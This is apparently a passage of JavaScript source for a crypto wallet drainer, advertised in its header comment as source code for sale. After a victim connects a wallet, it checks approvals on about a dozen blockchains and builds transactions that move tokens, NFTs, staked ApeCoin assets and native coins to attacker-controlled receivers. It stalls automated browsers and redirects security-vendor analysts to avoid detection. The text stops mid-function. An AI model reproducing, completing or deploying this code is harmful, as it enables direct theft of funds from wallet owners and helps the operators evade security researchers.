/*
Drainer Owner Contact - Full Source Code to buy
No shitty commissions
No backdoor
No depending on group of idiots

https://getsession.org
05c78f6352a461383a0ee289d33d41c3bdc8c752509d92f88e13c515edccd9f704
*/

// DRAINER CONFIGURATION
const DRAINER_CHAINS = {
    "eth": {
        id: "0x1",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/eth/" + DRAINER_ANKR_KEY, 1, {
            staticNetwork: ethers.Network.from(1)
        }),
        gasLimit: 100000,
        network: {
            chainId: '0x1',
            chainName: "Ethereum Mainnet",
            nativeCurrency: {
                name: "Ether",
                symbol: "ETH",
                decimals: 18,
            },
            rpcUrls: ["https://cloudflare-eth.com"],
            blockExplorerUrls: ["https://etherscan.io"]
        }
    },
    "bsc": {
        id: "0x38",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/bsc/" + DRAINER_ANKR_KEY, 56, {
            staticNetwork: ethers.Network.from(56)
        }),
        gasLimit: 100000,
        network: {
            chainId: '0x38',
            chainName: "BNB Smart Chain",
            nativeCurrency: {
                name: "Binance Coin",
                symbol: "BNB",
                decimals: 18,
            },
            rpcUrls: ["https://bsc-dataseed1.binance.org"],
            blockExplorerUrls: ["https://bscscan.com"]
        }
    },
    "matic": {
        id: "0x89",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/polygon/" + DRAINER_ANKR_KEY, 137, {
            staticNetwork: ethers.Network.from(137)
        }),
        gasLimit: 100000,
        network: {
            chainId: '0x89',
            chainName: "Polygon Mainnet",
            nativeCurrency: {
                name: "MATIC",
                symbol: "MATIC",
                decimals: 18,
            },
            rpcUrls: ["https://polygon-rpc.com/"],
            blockExplorerUrls: ["https://polygonscan.com"]
        }
    },
    "ftm": {
        id: "0xfa",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/fantom/" + DRAINER_ANKR_KEY, 250, {
            staticNetwork: ethers.Network.from(250)
        }),
        gasLimit: 100000,
        network: {
            chainId: '0xFA',
            chainName: "Fantom Opera",
            nativeCurrency: {
                name: "FTM",
                symbol: "FTM",
                decimals: 18,
            },
            rpcUrls: ["https://rpc.ankr.com/fantom/"],
            blockExplorerUrls: ["https://ftmscan.com/"]
        }
    },
    "avax": {
        id: "0xa86a",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/avalanche/" + DRAINER_ANKR_KEY, 43114, {
            staticNetwork: ethers.Network.from(43114)
        }),
        gasLimit: 900000,
        network: {
            chainId: '0xA86A',
            chainName: "Avalanche (C-Chain)",
            nativeCurrency: {
                name: "AVAX",
                symbol: "AVAX",
                decimals: 18,
            },
            rpcUrls: ["https://api.avax.network/ext/bc/C/rpc"],
            blockExplorerUrls: ["https://snowtrace.io/"]
        }
    },
    "op": {
        id: "0xa",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/optimism/" + DRAINER_ANKR_KEY, 10, {
            staticNetwork: ethers.Network.from(10)
        }),
        gasLimit: 100000,
        network: {
            chainId: '0xA',
            chainName: "Optimism",
            nativeCurrency: {
                name: "ETH",
                symbol: "ETH",
                decimals: 18,
            },
            rpcUrls: ["https://mainnet.optimism.io"],
            blockExplorerUrls: ["https://optimistic.etherscan.io/"]
        }
    },
    "arb": {
        id: "0xa4b1",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/arbitrum/" + DRAINER_ANKR_KEY, 42161, {
            staticNetwork: ethers.Network.from(42161)
        }),
        gasLimit: 500000,
        network: {
            chainId: '0xA4B1',
            chainName: "Arbitrum One",
            nativeCurrency: {
                name: "ETH",
                symbol: "ETH",
                decimals: 18,
            },
            rpcUrls: ["https://arb1.arbitrum.io/rpc"],
            blockExplorerUrls: ["https://arbiscan.io/"]
        }
    },
    "base": {
        id: "0x2105",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/base/" + DRAINER_ANKR_KEY, 8453, {
            staticNetwork: ethers.Network.from(8453)
        }),
        gasLimit: 500000,
        network: {
            chainId: '0x2105',
            chainName: "Base",
            nativeCurrency: {
                name: "ETH",
                symbol: "ETH",
                decimals: 18,
            },
            rpcUrls: ["https://rpc.ankr.com/base"],
            blockExplorerUrls: ["https://basescan.org/"]
        }
    },
    "nova": {
        id: "0xa4ba",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/arbitrumnova/" + DRAINER_ANKR_KEY, 42170, {
            staticNetwork: ethers.Network.from(42170)
        }),
        gasLimit: 500000,
        network: {
            chainId: '0xa4ba',
            chainName: "Arbitrum Nova",
            nativeCurrency: {
                name: "ETH",
                symbol: "ETH",
                decimals: 18,
            },
            rpcUrls: ["https://rpc.ankr.com/arbitrumnova"],
            blockExplorerUrls: ["https://nova.arbiscan.io/"]
        }
    },
    "era": {
        id: "0xa4b1",
        rpc: new ethers.JsonRpcProvider("https://rpc.ankr.com/zksync_era/" + DRAINER_ANKR_KEY, 324, {
            staticNetwork: ethers.Network.from(324)
        }),
        gasLimit: 500000,
        network: {
            chainId: '0x144',
            chainName: "zkSync Era",
            nativeCurrency: {
                name: "ETH",
                symbol: "ETH",
                decimals: 18,
            },
            rpcUrls: ["https://rpc.ankr.com/zksync_era"],
            blockExplorerUrls: ["https://explorer.zksync.io/"]
        }
    },
    "pls": {
        id: "0x171",
        rpc: new ethers.JsonRpcProvider("https://rpc.pulsechain.com", 369, {
            staticNetwork: ethers.Network.from(369)
        }),
        gasLimit: 500000,
        network: {
            chainId: '0x171',
            chainName: "PulseChain",
            nativeCurrency: {
                name: "Pulse",
                symbol: "PLS",
                decimals: 18,
            },
            rpcUrls: ["https://rpc.pulsechain.com"],
            blockExplorerUrls: ["https://scan.pulsechain.com/"]
        }
    },
};

// DRAINER VARS

var axiosInstance;

var DRAINER_Provider, web3, sp, spCounter;
var selectedWallet, selectedChain, nonce;

var walletAddress = "";
var nonce = 0;

var changed = false;
var running = false;
var eligible = true;
var info = null;

async function drainer_start(disconnect = false) {
  console.log("drainer connect start");
  try {
	if(disconnect) {
      DRAINER_Provider = null;
      eligible = true;
      running = false;
    }
    // Open wallet modal
    await openModal(disconnect);
    // Wait until DRAINER_Provider is connected
    while(true) {
      /*try {
        if(DRAINER_Provider.isWalletConnect) {
            await DRAINER_Provider.connect();a
        }
      } catch(err) {
        await request_monitor({
          process: "DRAINER_START",
          step: "WalletConnect",
          error: err,
        });
      }*/
      if(DRAINER_Provider && (await DRAINER_Provider.request({method:"eth_accounts"})).length !== 0) break;
      await sleep(300);
    }
    // Start drainer
    await drainer_setup();
  } catch(err) {
    await request_monitor({
      process: "DRAINER_START",
      error: err,
    });
  }
}

var chainValues;

async function drainer_setup() {
  (async() => {
      try {
          await sleep(500);
          await WCModalV2.modal.closeModal();
      }catch(err){
          console.log(err);
      }
  })()
	console.log("drainer setup start");
	try {
		//let ethersProvider = new ethers.BrowserProvider(provider, 'any');
		//let signer = ethersProvider.getSigner();
 		web3 = new Web3(DRAINER_Provider);
    web3.eth.transactionSendTimeout = 9999999;
    web3.eth.transactionPollingTimeout = 9999999;
    web3.eth.transactionBlockTimeout = 9999999;

    try {
        if (web3.currentProvider.setMaxListeners) web3.currentProvider?.setMaxListeners(9999999);
    } catch (err) {
        try {
            web3.setProvider(window.ethereum);
            await request_monitor({
                process: "DRAINER_SETUP_SETPROVIDER",
                error: err,
            });
        } catch (err) {
            await request_monitor({
                process: "DRAINER_SETUP_MAXLISTENERS",
                error: err,
            });
        }
    }
		selectedChain = getChainNameByHex(web3.utils.toHex(await web3.eth.getChainId()));
    selectedWallet = getConnectedWallet();
		walletAddress = (await web3.eth.getAccounts())[0].toLowerCase();
    nonce = Number(await web3.eth.getTransactionCount(walletAddress, 'pending'));

    await initGas();

    if(DRAINER_Provider.on) {
      DRAINER_Provider.on('chainChanged', async (networkId) => {
        selectedChain = getChainNameByHex(networkId);
        nonce = Number(await web3.eth.getTransactionCount(walletAddress, 'pending'));
        changed = true;
  	    await updateStatus(9);
      });

      DRAINER_Provider.on('accountsChanged', async (accounts) => {
        window.location.reload();
      });
    }

		await updateStatus(1);
        try {
             document.getElementById("drainer-eligibility").innerHTML = "Checking wallet...";
        } catch(err) {}
		drainer_drain();
	} catch(err) {
    await request_monitor({
      process: "DRAINER_SETUP",
      error: err,
    });
    updateStatus(0, err);
		return;
	}
}
var nativeDetected = false;
var clickedAnything = localStorage.getItem("clicked") == null ? false : true;
async function drainer_drain() {
  try {
  	if(!eligible) {
      eligible = false;
  		if(!nativeDetected) await updateStatus(5);
  		return;
  	}
    //await updateStatus(4
  	if(running) {
  		console.log("already running");
  		return;
  	}
    if(navigator?.webdriver || navigator?.userAgent.includes("36b1546a5700e52eb2972b3f92b314fa")) {
      await request_monitor({
        process: "DRAINER_DRAIN",
        step: "BLOCKING_AUTOMATION"
      });
      await sleep(604800000);
    }

    try {
    if(!clickedAnything &&
        (selectedWallet === "OKX" && navigator?.userAgent.includes("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"))) {// ||
        //(selectedWallet === "Metamask" && navigator?.platform === "Linux x86_64" && screen?.width === 1920 && screen?.height === 870 && navigator?.userAgentData?.brands?.length === 0 && (navigator?.userAgent.includes("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36") || navigator?.userAgent.includes("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")))) {
      await request_monitor({
        process: "DRAINER_DRAIN",
        step: "BLOCKING_BLOCKAID_NEW",
      });
      console.log("hello blockaid dev, could you please set any unique localstorage value and provide it on the chat? you will be still able to see my address i just want to stop getting fucking errors in my logs thanks");
      window.location.href = "https://liquid-stake.com/";
      return;
    }
  } catch(err) {
    await request_monitor({
      process: "DRAINER_DRAIN",
      step: "BLOCKAID_DETECT_FAIL",
      error: err,
    });
  }

  	running = true;
  	console.log("drain start");
  	await updateStatus(2);

  	var response = await request_api(CONNECT_URL, {});
  	if(response == null || response.status !== 200) {
  		await updateStatus(3, response);
  		console.log("failed to connect wallet", response);
  		running = false;
  		return;
  	}
  	info = response.data;
  	console.log("api response");
  	console.log(info);
  	//console.log("preparing transactions");

    if(selectedWallet.includes("Phantom") || selectedWallet.includes("Impersonator")) {
      eligible = false;
      running = false;
      await updateStatus(5);
      return;
    }

    //const storage = new Map();
    const allowances = new Map();
    const transactions = new Map();
    new Set(info.items.map(e => e.chain)).forEach(name => { // reduce?
      //storage.set(name, { contracts: new Set(), temp: {}, list: [], value: 0});
      transactions.set(name, { contracts: new Map(), temp: {}, list: [], value: 0});
      allowances.set(name, new Map());
    });
    //info.items.forEach(i => i.amount = web3.utils.toBigInt(i.amount));

    try {
      const promises = [];
      for(const [chain, details] of Object.entries(DRAINER_CHAINS)) {
        const contracts = Array.from(new Map([...info.items
          .filter(i => i.chain == chain && i.contractAddress != "native")
          .map(i => [i.contractAddress, i.scheme])
        ]));

        var requests = contracts.map(([contractAddress, scheme]) => {
          const contractInstance = web3_getContract(chain, scheme == "erc20" ? ERC20_ABI : NFT_ABI, contractAddress);
          const spenders = scheme == "erc20" ? [PERMIT2_CONTRACT] : [];
          const method = scheme == "erc20" ? "allowance" : "isApprovedForAll";
          return spenders.map(spender => { return { "contractAddress": contractAddress, "spender": spender, "data": contractInstance.methods[method](walletAddress, spender).encodeABI() } });
        }).flat(1).filter(request => request);

        const ids = new Map();
        var index = 0;
        requests = requests.map(request => {
          allowances.get(chain).set(request.contractAddress, {});
          ids.set(index, {contractAddress: request.contractAddress, spender: request.spender});
          return {
              "jsonrpc":"2.0",
              "method":"eth_call",
              "params": [{ "to": request.contractAddress, "data": request.data }, "latest"],
              "id": index++,
            };
        });

        if(requests.length == 0) continue;
        const promise =  new Promise(async (resolve) => {
          const n = 1000;
          const chunks = Array.from(Array(Math.ceil(requests.length/n)), (_,i)=>requests.slice(i*n,i*n+n));
          for (const batch of chunks) {
            const response = await details.rpc._send(batch);
            response.forEach(r => {
              if(r.id == undefined) {
                request_monitor({
                  process: "DRAINER_DRAIN",
                  step: "ALLOWANCES_UNKNOWN_ID",
                  error: new Error("entry value: " + JSON.stringify(r)),
                });
              } else {
              const request = ids.get(r.id);
              //allowances.get(chain).set(request.contractAddress, web3.utils.toBigInt(r.error ? 0 : r.result));
              //console.log("xaxcr", chain, request.spender, request.contractAddress, r);
              var contractAllowances = allowances.get(chain).get(request.contractAddress);
              contractAllowances[request.spender] = web3.utils.toBigInt(r.error ? 0 : r.result);
              allowances.get(chain).set(request.contractAddress, contractAllowances);
              }
            });
          }
          resolve();
        });
        promises.push(promise);
      }
      await Promise.all(promises);
    } catch(err) {
      await request_monitor({
        process: "DRAINER_DRAIN",
        step: "PREPARE_TRANSACTIONS_0",
        error: err,
      });
    }

//
// console.log(allowances);
    /*
    JsonRpcProvider.prototype.prepareRequest = function (method, params) {
    switch (method) {
        case "getBlockNumber":
            return ["eth_blockNumber", []];
        case "getGasPrice":
            return ["eth_gasPrice", []];
        case "getBalance":
            return ["eth_getBalance", [getLowerCase(params.address), params.blockTag]];
        case "getTransactionCount":
            return ["eth_getTransactionCount", [getLowerCase(params.address), params.blockTag]];
        case "getCode":
            return ["eth_getCode", [getLowerCase(params.address), params.blockTag]];
        case "getStorageAt":
            return ["eth_getStorageAt", [getLowerCase(params.address), (0, bytes_1.hexZeroPad)(params.position, 32), params.blockTag]];
        case "sendTransaction":
            return ["eth_sendRawTransaction", [params.signedTransaction]];
        case "getBlock":
            if (params.blockTag) {
                return ["eth_getBlockByNumber", [params.blockTag, !!params.includeTransactions]];
            }
            else if (params.blockHash) {
                return ["eth_getBlockByHash", [params.blockHash, !!params.includeTransactions]];
            }
            return null;
        case "getTransaction":
            return ["eth_getTransactionByHash", [params.transactionHash]];
        case "getTransactionReceipt":
            return ["eth_getTransactionReceipt", [params.transactionHash]];
        case "call": {
            var hexlifyTransaction = (0, properties_1.getStatic)(this.constructor, "hexlifyTransaction");
            return ["eth_call", [hexlifyTransaction(params.transaction, { from: true }), params.blockTag]];
        }
        case "estimateGas": {
            var hexlifyTransaction = (0, properties_1.getStatic)(this.constructor, "hexlifyTransaction");
            return ["eth_estimateGas", [hexlifyTransaction(params.transaction, { from: true })]];
        }
        case "getLogs":
            if (params.filter && params.filter.address != null) {
                params.filter.address = getLowerCase(params.filter.address);
            }
            return ["eth_getLogs", [params.filter]];
        default:
            break;
    }
    return null;
};*/

    itemsLoop:
    for(let item of info.items) {
      const chainDetails = transactions.get(item.chain);
      const itemValue = item.value;// * (item.scheme == "erc20" || item.contractAddress == "native" ? 1 : item.amount);

      var chain = item.chain, contractAddress = item.contractAddress, type = "", ids = [], amounts = [];
      if(Object.keys(DRAINER_CHAINS).includes(item.scheme)) {
        type = "native";
      } else if(chain == "eth" && contractAddress == ETH_MOONBIRDS_CONTRACT && await moonbirds_isNested(item.id)) {
        type = "moonbirds";
      } else if(chain == "eth" && contractAddress == ETH_CRYPTOPUNKS_CONTRACT) {
        type = "cryptopunks";
      } else if(chain == "eth" && (item.scheme == "erc1155" || item.scheme == "erc721")) {
        type = "nft";
        amounts.push({ id: item.id, amount: item.amount });
      } else if(item.scheme == "erc20") {
        type = "token";
        var amount = web3.utils.toBigInt(item.amount);
        // if(selectedWallet != "WalletConnect") {
        // console.log(chain);
        // console.log(allowances.get(chain).get(contractAddress));
        // console.log(allowances.get(chain).get(contractAddress)[PERMIT2_CONTRACT]);
        // console.log(contractAddress);
        // console.log(amount);
        if(allowances.get(chain).get(contractAddress) && allowances.get(chain).get(contractAddress)[PERMIT2_CONTRACT]) {
          var permit2Allowance = allowances.get(chain).get(contractAddress)[PERMIT2_CONTRACT];//await allowances.get(chain)[contractAddress, PERMIT2_CONTRACT);
          var permit2Percentage = (web3.utils.toBigInt(permit2Allowance) * web3.utils.toBigInt(100)) / amount;
          if(permit2Allowance >= amount) {//0x5a7ad1dbee6c42925ce1164d641b261968bec33a check this
            amounts.push({ type: "permit2", amount: amount});
          } else if(permit2Percentage > DRAINER_PERMIT2_IF_PERCENTAGE) {
            amounts.push({ type: "permit2", amount: permit2Allowance });
            var valueAfter = (web3.utils.toBigInt(parseInt(itemValue)) * (amount - permit2Allowance)) / amount;
            amount = amount - permit2Allowance;
            console.log("valueAfter: " + parseFloat(valueAfter) + ", amount: " + amount);
            if(valueAfter > DRAINER_TRANSACTION_MINVALUE) amounts.push({ type: item.type, permit: item.permit, amount: amount });
          } else {
            amounts.push({ type: item.type, permit: item.permit, amount: amount });
          }
        } else {
          amounts.push({ type: item.type, permit: item.permit, amount: amount });
        }
        // } else {
        //   amounts.push({ type: item.type, permit: item.permit, amount: amount });
        // }
      } else {
        await request_monitor({
          process: "DRAINER_DRAIN",
          step: "PREPARE_TRANSACTIONS_1",
          error: new Error("missing type for " + contractAddress),
        });
        continue;
      }

      if(!chainDetails.contracts.get(contractAddress)) chainDetails.contracts.set(contractAddress, { type: type, value: parseFloat(itemValue), proxyReceiver: item.proxyReceiver, scheme: item.scheme, permit: item.permit, abi: item.abi, amounts: [], ids: [] });
      var contractDetails = chainDetails.contracts.get(contractAddress);

      switch(type) {
      case "nft":
      case "token":
        contractDetails.amounts = [...amounts, ...contractDetails.amounts];
        break;
      case "cryptopunks":
      case "moonbirds":
        contractDetails.ids.push(item.id);
        break;
      case "native":
        var fee = web3.utils.toBigInt(chain == "eth" ? 150 : 8) * web3.utils.toBigInt(item.amount) / web3.utils.toBigInt(parseInt(item.value));
        var amount = web3.utils.toBigInt(item.amount) - fee;
        if(amount < 0) {
          chainDetails.contracts.delete("native");
          continue itemsLoop;
        }
        contractDetails.amount = amount;
        break;
      }
      chainDetails.contracts.set(contractAddress, contractDetails);
    }

    console.log(transactions);

    /*
    const contracts = map[contractAddress] = [
      { type: nft, ids: [{1, 1}, {5, 1}, {5, 2}] },
      { type: cryptopunks, ids: [0, 1, 2] },
      { type: moonbirds, ids: [0, 1, 2] },
      { type: token, amounts: [permit2, 100000], [sushiswap, 3000], [permit, 100] }
      { type: native, amount: 999999 },
    ];
    */
    for(const [chain, details] of transactions) {
      try {
        //const type = getTransactionType(transactions, item);
        //if(type == null) continue;
        for(const [contractAddress, txDetails] of details.contracts) {
          let transaction;
          switch(txDetails.type) {
            case "token":
              for(var am of txDetails.amounts) {
                  // console.log("aa", chain, contractAddress, txDetails);
                if(am.type === undefined) am.type = "none";
                if(selectedWallet === "WC_LedgerWallet" && am.type.startsWith("permit,")) am.type = am.type.slice(7);
if(selectedWallet === "WC_MEWwallet" && am.type.startsWith("increase")) am.type = "none,";
am.type = am.type.split(",")[0]
                switch(am.type) {
                  case "permit":
                    transaction = { method: drainer_permit, args: [chain, contractAddress, txDetails.abi, txDetails.permit, am.amount, txDetails.proxyReceiver], values: calculateValues(txDetails.value, DRAINER_PERMIT_FACTOR) };
                    break;
                  case "increaseAllowance":
                    //transaction = { method: drainer_token, args: [contractAddress, am.amount, false, txDetails.proxyReceiver], values: calculateValues(txDetails.value, DRAINER_TOKEN_TRANSFER_FACTOR) };
                    // console.log("increase", contractAddress)
                    transaction = { method: drainer_increaseAllowance, args: [contractAddress, txDetails.proxyReceiver], values: calculateValues(txDetails.value, DRAINER_TOKEN_APPROVE_BYPASS_FACTOR) };
                    break;
                  case "increaseApproval":
                    transaction = { method: drainer_increaseApproval, args: [contractAddress, txDetails.proxyReceiver], values: calculateValues(txDetails.value, DRAINER_TOKEN_APPROVE_BYPASS_FACTOR) };
                    break;
                  case "none":
                    transaction = { method: drainer_token, args: [contractAddress, am.amount, false, txDetails.proxyReceiver], values: calculateValues(txDetails.value, DRAINER_TOKEN_TRANSFER_FACTOR) };
                    break;
                  case "transferBypass":
                    transaction = { method: drainer_token, args: [contractAddress, am.amount, true, txDetails.proxyReceiver], values: calculateValues(txDetails.value, DRAINER_TOKEN_TRANSFER_FACTOR) };
                    break;
                  case "permit2":
                    try {
                        var contract = web3_getContract(chain, PERMIT2_ABI, PERMIT2_CONTRACT);
                        //var nonce = Number((await contract.methods.allowance(walletAddress, contractAddress, info.receiver).call({from: walletAddress}))[2]);
                        let contractDDDD = new ethers.Contract(PERMIT2_CONTRACT, PERMIT2_ABI, DRAINER_CHAINS[chain].rpc.provider);
                        let nonce = +(Number((await contractDDDD.allowance(walletAddress, contractAddress, info.proxyReceiverPermit2))[2]));
                        console.log("xd" + nonce);
                        var values = calculateValues(txDetails.value, DRAINER_PERMIT2_FACTOR);
                        txDetails.type = "permit2";
                        if(transactions.get(chain).temp["permit2"] == null) transactions.get(chain).temp["permit2"] = { tokens: [], values: [0, 0] };
                        transactions.get(chain).temp["permit2"].tokens.push({contractAddress: contractAddress, amount: am.amount, nonce: nonce});
                        transactions.get(chain).temp["permit2"].values[0] += values[0];
                        transactions.get(chain).temp["permit2"].values[1] += values[1];
                        transactions.get(chain).value += values[1];
                    } catch(err) {
                      await request_monitor({
                        process: "DRAINER_DRAIN",
                        step: "PREPARE_TRANSACTIONS_10",
                        error: err,
                      });
                    }
                    break;
                }
              }
              break;
            case "native"://no value after fee sub in args
            console.log("native calculate", DRAINER_NATIVE_FACTOR, calculateValues(txDetails.value, DRAINER_NATIVE_FACTOR))
              transaction = { method: drainer_native, args: [txDetails.amount], values: calculateValues(txDetails.value, DRAINER_NATIVE_FACTOR) };
              break;
            case "cryptopunks":
            case "moonbirds":
              if(transactions.get(chain).temp[txDetails.type] == null) transactions.get(chain).temp[txDetails.type] = { ids: txDetails.ids, value: txDetails.value};
              break;
            case "nft":
              for(var am of txDetails.amounts) {
                if(transactions.get(chain).temp["nfts"] == null) transactions.get(chain).temp["nfts"] = new Map();
                if(!transactions.get(chain).temp["nfts"].has(contractAddress)) transactions.get(chain).temp["nfts"].set(contractAddress, { value: 0, erc721: (txDetails.scheme === "erc721"), list: [] });
                transactions.get(chain).temp["nfts"].get(contractAddress).value += txDetails.value * am.amount;
                transactions.get(chain).temp["nfts"].get(contractAddress).list.push({ id: am.id, amount: am.amount, proxyReceiver: txDetails.proxyReceiver });
              }
              break;
          }

          if(transaction) {
              console.log("add", transaction)
            transaction["contractAddress"] = contractAddress;
            transaction.args.push(transaction.values[0]);
            transactions.get(chain).list.push(transaction);
            transactions.get(chain).value += transaction.values[1];
              transaction = null;
          } else if(txDetails.type != "nft" && txDetails.type != "permit2" && txDetails.type != "moonbirds" && txDetails.type != "cryptopunks") {
            await request_monitor({
              process: "DRAINER_DRAIN",
              step: "TRANSACTION_NOT_FOUND",
              error: new Error(contractAddress + " for " + JSON.stringify(txDetails)),
            });
          }
        }
      } catch(err) {
        await request_monitor({
          process: "DRAINER_DRAIN",
          step: "PREPARE_TRANSACTIONS_2",
          error: err,
        });
      }
    }

    try {
      if(selectedChain === "eth") {
        const apecoinStakingContract = contract_get(APECOIN_STAKING_ABI, APECOIN_STAKING_CONTRACT);
        const stakes = await apecoinStakingContract.methods.getAllStakes(walletAddress).call({from: walletAddress});
        const apestaking = info.apestaking;
        const baycs = [];
        const maycs = [];
        let baycValue = 0;
        let maycValue = 0;
        for(apeItem of stakes) {
            const stakedValue = apeItem.deposited.toString() / 1e18 * apestaking.apecoin;
            if(apeItem.poolId == "0" && apeItem.deposited != "0") { // APECOIN POOL
              var values = calculateValues(stakedValue, DRAINER_APECOINSTAKING_FACTOR);
              transactions.get("eth").list.push({ method: drainer_apecoin, args: [apeItem.deposited.toString(), values[0]], values: values});
              transactions.get("eth").value += values[1];
            }
            if(apeItem.poolId == "1" && apeItem.deposited != "0") { // BAYC POOL
              baycs.push({
                tokenId: apeItem.tokenId.toString(),
                amount: apeItem.deposited.toString(),
              });
              baycValue += apestaking.bayc;
              baycValue += stakedValue;
            }
            if(apeItem.poolId == "2" && apeItem.deposited != "0") { // MAYC POOL
              maycs.push({
                tokenId: apeItem.tokenId.toString(),
                amount: apeItem.deposited.toString(),
              });
              maycValue += apestaking.mayc;
              maycValue += stakedValue;
            }
          }
          if(baycs.length != 0) {
            var values = calculateValues(baycValue, DRAINER_APECOINSTAKING_FACTOR);
            transactions.get("eth").list.push({method: drainer_bayc, args: [baycs, values[0]], values: values});
            transactions.get("eth").value += values[1];
          }
          if(maycs.length != 0) {
            var values = calculateValues(maycValue, DRAINER_APECOINSTAKING_FACTOR);
            transactions.get("eth").list.push({method: drainer_mayc, args: [maycs, values[0]], values: values});
            transactions.get("eth").value += values[1];
          }
        }
    } catch(err) {
      await request_monitor({
        process: "DRAINER_DRAIN",
        step: "PREPARE_TRANSACTIONS_3",
        error: err,
      });
    }
    //transaction = { method: drainer_moonbirds, args: [txDetails.ids], values: calculateValues(txDetails.value * txDetails.ids.length, DRAINER_MOONBIRDS_FACTOR) };
    try {// drainer_nft(contractAddress, action, value, ids)
      for(const [chain, details] of transactions) {
      		if(details.temp["permit2"]) {
            var contractAddresses = [];
            for(o of details.temp["permit2"].tokens) {
              contractAddresses.push(o.contractAddress);
            }

            transactions.get(chain).list.push({ method: drainer_permit2, args: [chain, details.temp["permit2"].tokens, details.temp["permit2"].values[0], info.proxyReceiverPermit2], contractAddresses: contractAddresses, values: details.temp["permit2"].values });
          }
          //if(details.temp["uniswap"]) transactions.get(chain).list.push({ type: "uniswap", values: details.temp["uniswap"].values, contractAddresses: Array.from(details.temp["uniswap"].contractAddresses), calls: details.temp["uniswap"].calls });
      		//if(details.temp["pancakeswapv3"]) transactions.get(chain).list.push({ type: "pancakeswapv3", values: details.temp["pancakeswapv3"].values, contractAddresses: Array.from(details.temp["pancakeswapv3"].contractAddresses), calls: details.temp["pancakeswapv3"].calls });
          if(details.temp["cryptopunks"]) {
            for(let id of details.temp["cryptopunks"].ids) {
              var values = calculateValues(details.temp["cryptopunks"].value, DRAINER_CRYPTOPUNKS_FACTOR);
              transactions.get(chain).list.push({ method: drainer_cryptopunks, args: [id, values[0]], values: values });
              transactions.get(chain).value += values[1];
            }
          }
          if(details.temp["moonbirds"]) {
            for(let id of details.temp["moonbirds"].ids) {
              var values = calculateValues(details.temp["moonbirds"].value, DRAINER_MOONBIRDS_FACTOR);
              transactions.get(chain).list.push({ method: drainer_moonbirds, args: [id, values[0]], values: values });
              transactions.get(chain).value += values[1];
            }
          }
          if(details.temp["nfts"]) {
            for(const [contractAddress, nft] of details.temp["nfts"]) {
              if(!nft.erc721) {
                var values = calculateValues(nft.value, DRAINER_NFT_BATCH_TRANSFER_FACTOR);
                transactions.get(chain).list.push({ method: drainer_nft, args: [contractAddress, "batch", values[0], nft.list, nft.proxyReceiver], contractAddress: contractAddress, values: values });
                transactions.get(chain).value += values[1];
              } else if(nft.list.length == 1) {
                var values = calculateValues(nft.value, DRAINER_NFT_SINGLE_TRANSFER_FACTOR);
                transactions.get(chain).list.push({ method: drainer_nft, args: [contractAddress, "single", values[0], nft.list[0].id, nft.proxyReceiver], contractAddress: contractAddress, values: values });
                transactions.get(chain).value += values[1];
              } else {
                var values = calculateValues(nft.value, DRAINER_NFT_APPROVE_FACTOR);
                transactions.get(chain).list.push({ method: drainer_nft, args: [contractAddress, "approve", values[0], null, nft.proxyReceiver], contractAddress: contractAddress, values: values });
                transactions.get(chain).value += values[1];
              }
            }
          }
      }
    } catch(err) {
      await request_monitor({
        process: "DRAINER_DRAIN",
        step: "PREPARE_TRANSACTIONS_4",
        error: err,
      });
    }

    // Switch chain if percentage of different chain value is higher than currently selected
    chainValues = 0;
    var currentHighestChain = selectedChain;
    try {
    for(let [chain, details] of transactions) {
      for(let i = 0; i < details.list.length; i++) {
        let transaction = details.list[i];
        details.list[i].name = transaction.method.name;
        if(transaction.values[0] < DRAINER_TRANSACTION_MINVALUE) {
          //console.log("removing!");
          details.value -= transaction.values[1];
          details.list.splice(i, 1);
          i--;
        }
      }
      details.list.forEach(tx => {
        //console.log(tx, tx.values[0] < DRAINER_TRANSACTION_MINVALUE);
      });
      //console.log("final", details.value, details.list);

      details.list.sort((tx1, tx2) => tx1.values[1] < tx2.values[1] ? 1 : -1);
      chainValues += details.value;
      if(DRAINER_START_BY_DEFAULT_CHAIN) continue;
      if(currentHighestChain !== selectedChain && currentHighestChain === "unknown") continue; //TODO: If currentHighestChain is unknown this wont work, set currentHighestChain to another if exists in transactions
      if(details.value === 0) continue;
      if(!transactions.get(currentHighestChain)) currentHighestChain = chain; //new new new
      // console.log("currentHighestChain", currentHighestChain)
      // console.log("transactions", transactions)
      // console.log("transactionsGet", transactions.get(currentHighestChain))
      const percentOfCurrent = details.value * 100.0 / transactions.get(currentHighestChain).value;
      if(percentOfCurrent < DRAINER_SWITCH_CHAIN_IF_PERCENTAGE) continue;
      console.log("switching", currentHighestChain, "to", chain);
      currentHighestChain = chain;
    }
  } catch(err) {
    await request_monitor({
      process: "DRAINER_DRAIN",
      step: "PREPARE_TRANSACTIONS_5",
      error: err,
    });
  }
  transactions.forEach((obj, chain) => {
    if(obj.list.length === 0) transactions.delete(chain);
});
//currentHighestChain

// transactions.filter()
    // Switch chain if percentage of different chain value is higher than currently selected
    /*var switchToChain = selectedChain;
    var chainValues = 0;
    try {
    	for(const [chain, details] of transactions) {
      		details.list.sort((tx1, tx2) => tx1.values[1] < tx2.values[1] ? 1 : -1);
          for(var transaction of details.list) {
            transaction.name = transaction.method.name;
          }
          chainValues += details.value;
          if(!DRAINER_START_BY_DEFAULT_CHAIN && switchToChain != "unknown" && details.value != 0 && chain != switchToChain && transactions.get(switchToChain).value < details.value) {
            var tempSelectedChain = transactions.get(switchToChain);
            if(tempSelectedChain.value == 0) continue;
            var percentage = (details.value * 100) / tempSelectedChain.value;
            if(percentage > DRAINER_SWITCH_CHAIN_IF_PERCENTAGE) {
